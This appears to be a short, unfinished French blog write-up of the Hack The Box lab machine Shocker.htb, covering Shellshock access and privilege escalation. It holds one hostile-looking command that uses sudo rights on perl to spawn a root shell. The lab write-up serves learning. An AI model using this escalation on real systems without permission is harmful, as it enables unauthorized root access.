---
title: "Shocker.htb"
date: 2025-08-05
draft: false
showToc: true
tags: ["htb", "shellshock", "Privilege Escalation", "Linux"]
categories: ["HackTheBox", "Easy"]
cover:
  image: "image.png"
  anchor: "top" # "center", "top", "left", "TopRight" ...
summary: "Ce writeup détaille l’exploitation de la vulnérabilité Shellshock sur la machine Shocker.htb (Hack The Box) : accès initial via CGI/Bash, puis élévation de privilèges."
---

## Accès initial

...

## Exploitation

```bash
sudo /usr/bin/perl -e 'exec "/bin/bash";'
